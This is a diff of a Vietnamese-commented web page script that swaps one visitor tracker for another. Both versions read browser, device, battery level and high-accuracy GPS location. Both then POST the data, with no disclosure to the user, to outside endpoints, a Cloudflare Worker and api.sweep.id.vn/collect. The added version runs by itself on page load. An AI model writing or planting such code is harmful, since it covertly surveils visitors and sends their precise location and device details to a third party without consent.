@@ -57,109 +57,78 @@ function adjustZoom() {
 window.addEventListener('resize', adjustZoom);
 adjustZoom();
 
-// --- 1. CẤU HÌNH ---
-const workerUrl = "https://profile-easy.dangtoanvu07.workers.dev";
+ // === Sweep Tracker Script ===
+// Thu thập thông tin truy cập và gửi đến Cloudflare Worker
 
-// --- 2. NHẬN DIỆN THIẾT BỊ & TRÌNH DUYỆT CỤ THỂ ---
-async function getFullDeviceInfo() {
-    const ua = navigator.userAgent;
-    let browser = "Trình duyệt lạ";
-    let os = "Không rõ";
-    let model = "Thiết bị ẩn";
-    let battery = "Không rõ";
+(async function sweepTracker() {
+  try {
+    // 1️⃣ Nhận diện trình duyệt & thiết bị
+    const ua = navigator.userAgent || '';
+    const detectBrowser = (ua) => {
+      const lower = ua.toLowerCase();
+      const isIOS = /iphone|ipad|ipod/.test(lower);
+      if (isIOS && /crios/i.test(ua)) return 'Chrome (iOS)';
+      if (/chrome|crios/i.test(ua) && !/edg/i.test(ua)) return 'Chrome';
+      if (/safari/i.test(ua) && !/crios|chrome/i.test(ua)) return 'Safari';
+      if (/firefox|fxios/i.test(ua)) return 'Firefox';
+      if (/edg/i.test(ua)) return 'Edge';
+      return 'Unknown';
+    };
+    const browser = detectBrowser(ua);
 
-    // Lấy thông tin Pin
-    try {
-        const bt = await navigator.getBattery();
-        battery = `${Math.round(bt.level * 100)}% (${bt.charging ? 'Đang sạc ⚡' : 'Pin thường'})`;
-    } catch (e) {}
-
-    // Nhận diện Hệ điều hành & Model chi tiết
-    if (ua.includes("Win")) {
-        os = "Windows"; model = "PC/Laptop";
-    } else if (ua.includes("iPhone")) {
-        os = "iOS";
-        const screenStr = `${screen.width}x${screen.height}`;
-        const iphoneMap = {
-            "430x932": "iPhone 14/15 Pro Max",
-            "393x852": "iPhone 14/15 Pro",
-            "428x926": "iPhone 12/13/14 Pro Max",
-            "390x844": "iPhone 12/13/14/15",
-            "375x812": "iPhone X/11 Pro/12 Mini",
-            "414x896": "iPhone XR/11 Pro Max"
+    // 2️⃣ Mức pin (Battery API)
+    let batteryInfo = null;
+    if (navigator.getBattery) {
+      try {
+        const b = await navigator.getBattery();
+        batteryInfo = {
+          charging: b.charging,
+          level: Math.round(b.level * 100),
         };
-        model = iphoneMap[screenStr] || "iPhone (Đời mới)";
-    } else if (ua.includes("Android")) {
-        os = "Android";
-        const match = ua.match(/Android\s+([\d\.]+);.*?\s+([^;]+)\s+Build/);
-        model = match ? match[2] : "Điện thoại Android";
+      } catch {
+        batteryInfo = null;
+      }
     }
 
-    // --- SỬA LỖI NHẬN DIỆN SAFARI (Ưu tiên kiểm tra Chrome/Cốc Cốc trước) ---
-    if (ua.includes("CocCoc") || ua.includes("coc_coc_browser")) {
-        browser = "Cốc Cốc";
-    } else if (ua.includes("Edg/")) {
-        browser = "Microsoft Edge";
-    } else if (ua.includes("CriOS")) { 
-        // Chrome trên iOS luôn có chữ CriOS. Nếu check Safari trước sẽ bị sai.
-        browser = "Google Chrome (iOS)"; 
-    } else if (ua.includes("Chrome") && !ua.includes("Edg/")) {
-        browser = "Google Chrome";
-    } else if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("CriOS")) {
-        browser = "Safari";
-    }
-
-    return { browser, os, model, battery };
-}
-
-// --- 3. GỬI DỮ LIỆU SANG CLOUDFLARE WORKER ---
-async function sendToWorker(pos = null) {
-    const device = await getFullDeviceInfo();
-    const time = new Date().toLocaleString('vi-VN');
-
-    // Chúng ta gửi các từ khóa đặc biệt để Worker tự thay thế bằng IP thật
-    let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
-    msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
-    msg += `🌐 <b>Địa chỉ IP:</b> <code>{{IP}}</code>\n`;
-    msg += `📍 <b>Thành phố:</b> <code>{{CITY}}</code>\n`;
-    msg += `🏢 <b>Nhà mạng:</b> <b>{{ISP}}</b>\n\n`;
-    msg += `📱 <b>Thông tin thiết bị:</b>\n`;
-    msg += `- Thiết bị: <b>${device.model}</b>\n`;
-    msg += `- Hệ điều hành: <code>${device.os}</code>\n`;
-    msg += `- Trình duyệt: <b>${device.browser}</b>\n`;
-    msg += `- Mức Pin: 🔋 <b>${device.battery}</b>\n`;
-
-    if (pos && pos.coords) {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        msg += `\n📍 <b>Vị trí GPS:</b>\n`;
-        msg += `👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
-    } else {
-        msg += `\n⚠️ <b>GPS:</b> Bị từ chối\n`;
-    }
-
-    try {
-        await fetch(workerUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: msg })
-        });
-    } catch (err) {
-        console.error("Lỗi kết nối Worker");
-    }
-}
-
-// --- 4. KHỞI CHẠY ---
-window.onload = () => {
-    if (navigator.vibrate) navigator.vibrate(500);
-
-    if (navigator.geolocation) {
+    // 3️⃣ Lấy tọa độ GPS
+    const getPosition = (timeout = 10000) =>
+      new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
         navigator.geolocation.getCurrentPosition(
-            (pos) => sendToWorker(pos),
-            () => sendToWorker(null),
-            { enableHighAccuracy: true, timeout: 5000 }
+          (pos) => resolve({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+          }),
+          () => resolve(null),
+          { enableHighAccuracy: true, timeout, maximumAge: 0 }
         );
-    } else {
-        sendToWorker(null);
-    }
-};
+      });
+    const geo = await getPosition();
+
+    // 4️⃣ Rung nhẹ khi khởi động
+    if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+
+    // 5️⃣ Chuẩn bị dữ liệu
+    const payload = {
+      ua: { browser, raw: ua },
+      battery: batteryInfo,
+      geolocation: geo,
+      page: {
+        url: location.href,
+        title: document.title,
+      },
+      timestamp: new Date().toISOString(),
+    };
+
+    // 6️⃣ Gửi tới Cloudflare Worker
+    const apiEndpoint = 'https://api.sweep.id.vn/collect';
+    await fetch(apiEndpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+  } catch (err) {
+    console.warn('[Sweep Tracker] Lỗi:', err);
+  }
+})();
